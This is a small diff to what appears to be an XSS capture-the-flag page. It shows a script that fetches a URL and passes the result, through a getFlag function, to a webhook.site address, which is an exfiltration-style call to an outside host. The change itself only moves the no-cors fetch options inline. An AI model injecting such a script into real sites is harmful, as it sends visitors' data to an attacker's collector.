@@ -33,10 +33,10 @@ layout: xss
     let noCorsUrl = "https://jsonplaceholder.typicode.com/todos/1";
     let webhook = "https://webhook.site/e1c87264-f400-40d6-afa9-6ba829adcfbe/";
 
-    let options = {
+    /*let options = {
         mode: 'no-cors' // 'cors' by default
-    };
-    fetch(noCorsUrl, options)
+    };*/
+    fetch(noCorsUrl, { mode: 'no-cors' })
         .then(res => res.json)
         .then(text => getFlag(webhook, text))
 </script>
